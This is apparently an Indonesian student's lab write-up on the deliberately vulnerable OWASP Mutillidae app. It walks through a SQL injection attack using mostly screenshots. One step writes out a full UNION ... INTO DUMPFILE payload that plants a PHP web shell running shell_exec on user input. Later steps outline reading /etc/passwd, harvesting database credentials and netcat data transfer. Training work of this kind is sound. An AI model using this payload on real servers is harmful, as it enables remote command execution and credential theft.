1. Melihat database pada mutillidae. 
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20database%20dan%20use%20owasp10.PNG "DATABASES PADA MUTILLIDAE")
  
   2. Melihat tabel database owasp10
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20tables%20owasp10.PNG "TABEL PADA OWASP10")
  
   3. Melihat field pada tabel account
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/desc%20accounts.PNG "FIELD TABEL ACCOUNT")
  
   4. Buka mutillidae pada browser
   5. Menuju menu user info. OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info
   6. Inspect elemen pada textbox name, lalu ubah size.
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/inspect%20elemet%20100.PNG "INSPECT ELEMEN dan UBAH SIZE")
  
   7. Melakukan Backdoor Union SQL Union Injection. Bertujuan untuk membuat file axecute_command.php. Dengan perintah " ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --  "
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/hasil%20execue%20command.PNG "Membuat file execute_command.php")
  
   8. Membuka execute_command.php
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_1.PNG "Membuka execute_command.php")
  
   9. Mengetahui siapa yang log in
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_2.PNG "Mengetahui siapa yang log in")

  10. Exploring /etc/passwd
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_3.PNG "Exploring /etc/passwd")
  
  11. Network Reconnaissance
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_4.PNG "Network Reconnaissance")
  
  12. Database Reconnasissance: mencari semua file php yang terdapat string password
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section11_1.PNG "daftar file dan stringnya")
  
  13. Menampilkan script php MySQLHandler.php, mencari username dan password database
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section11_2%203.PNG "MySQLHandler.php")
  
  14. Netcat Reconnaissance: mencari letak netcat dan jumlah yang menggunakan port tersebut
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section12_1.PNG "Port 4444")
  
  15. Eksekusi netcat
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section12_2.PNG "Transfering Data")
  
  16. Eksekusi netcat
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section12_2.PNG "Transfering Data")
  
  17. Connect netcat dan test
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section12_3.PNG "Perintah Whoami")
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section12_3a.PNG "Perintah hostname")
  
  18. Menampilkan database
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/uroot%20psamurai.PNG "Databases")
  
   19. Menampilkan tabel dalam database
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20tables.PNG "Tables")
  
   20. Menampilkan tabel account
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/tabel%20account.PNG "Table Account")
  
